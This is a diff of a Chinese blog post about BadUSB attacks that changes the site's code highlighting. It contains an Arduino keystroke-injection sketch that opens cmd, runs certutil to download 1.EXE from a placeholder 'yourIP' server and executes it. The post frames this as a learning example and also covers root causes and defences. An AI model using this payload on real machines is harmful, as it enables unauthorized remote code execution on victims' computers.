@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="0x00 锲子这篇博文缘起公司一位单片机dalao的月末技术分享，当时觉得是挺有意思的，顺带着自己目前的研究方向又是偏向硬件（无线）、协议这一块，又恰好之前公司接了一家公司的授权实地渗透，当时有想法是就是扔badusb（捂脸），这边仅记录下学习过程。">
@@ -100,7 +100,7 @@
   </style>
 </noscript>
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -354,11 +354,36 @@
 <h2 id="0x04-攻击代码-amp-演示"><a href="#0x04-攻击代码-amp-演示" class="headerlink" title="0x04 攻击代码&amp;演示"></a>0x04 攻击代码&amp;演示</h2><h3 id="贴下实物："><a href="#贴下实物：" class="headerlink" title="贴下实物："></a>贴下实物：</h3><p> 这边买的是某宝上制成U盘模样的Arduino Leonardo，50RMB左右就能入手一块了，恶意代码可以用Arduino进行烧录</p>
 <p><img src="./6.png" alt=""> </p>
 <h3 id="贴下代码："><a href="#贴下代码：" class="headerlink" title="贴下代码："></a>贴下代码：</h3><p>这边贴的是一个最简单的cmd远端下载恶意文件执行，因为只是为了解原理，所以没有加绕杀软uac的代码:</p>
-<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Keyboard.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">begin</span>();<span class="comment">//开始键盘通讯</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">1000</span>);<span class="comment">//延时</span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_LEFT_GUI);<span class="comment">//win键</span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(<span class="string">'r'</span>);<span class="comment">//r键</span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_LEFT_GUI);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(<span class="string">'r'</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">"CMD.EXE"</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">"certutil -urlcache -split -f http://yourIP/1.EXE D:\\1.exe"</span>); <span class="comment">//服务器下载恶意文件</span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">"D:\\1.exe"</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">"exit"</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">end</span>();<span class="comment">//结束键盘通讯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span><span class="comment">//循环</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>#include &lt;Keyboard.h&gt;
+void setup() {
+Keyboard.begin();//开始键盘通讯
+delay(1000);//延时
+Keyboard.press(KEY_LEFT_GUI);//win键
+Keyboard.press(&#39;r&#39;);//r键
+Keyboard.release(KEY_LEFT_GUI);
+Keyboard.release(&#39;r&#39;);
+Keyboard.press(KEY_CAPS_LOCK);
+Keyboard.release(KEY_CAPS_LOCK);
+delay(500);
+Keyboard.println(&quot;CMD.EXE&quot;);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+delay(1000);
+Keyboard.println(&quot;certutil -urlcache -split -f http://yourIP/1.EXE D:\\1.exe&quot;); //服务器下载恶意文件
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+Keyboard.println(&quot;D:\\1.exe&quot;);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+Keyboard.println(&quot;exit&quot;);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+Keyboard.end();//结束键盘通讯
+}
 
-
-
-<h3 id="插入BadUsb："><a href="#插入BadUsb：" class="headerlink" title="插入BadUsb："></a>插入BadUsb：</h3><p><img src="./9.jpg" alt=""></p>
+void loop()//循环
+{
+}</code></pre><h3 id="插入BadUsb："><a href="#插入BadUsb：" class="headerlink" title="插入BadUsb："></a>插入BadUsb：</h3><p><img src="./9.jpg" alt=""></p>
 <h3 id="贴下getShell图片："><a href="#贴下getShell图片：" class="headerlink" title="贴下getShell图片："></a>贴下getShell图片：</h3><p><img src="./10.jpg" alt=""></p>
 <h3 id="贴下视频："><a href="#贴下视频：" class="headerlink" title="贴下视频："></a>贴下视频：</h3><p>这边贴下<a href="https://v.youku.com/v_show/id_XODQ0NzYxNDg0.html" target="_blank" rel="noopener">玄武实验室的视频链接</a></p>
 <h3 id="0x05-漏洞根源及防御对策的可行性"><a href="#0x05-漏洞根源及防御对策的可行性" class="headerlink" title="0x05 漏洞根源及防御对策的可行性"></a>0x05 漏洞根源及防御对策的可行性</h3><h3 id="漏洞原因："><a href="#漏洞原因：" class="headerlink" title="漏洞原因："></a>漏洞原因：</h3><ul>
@@ -498,6 +523,8 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
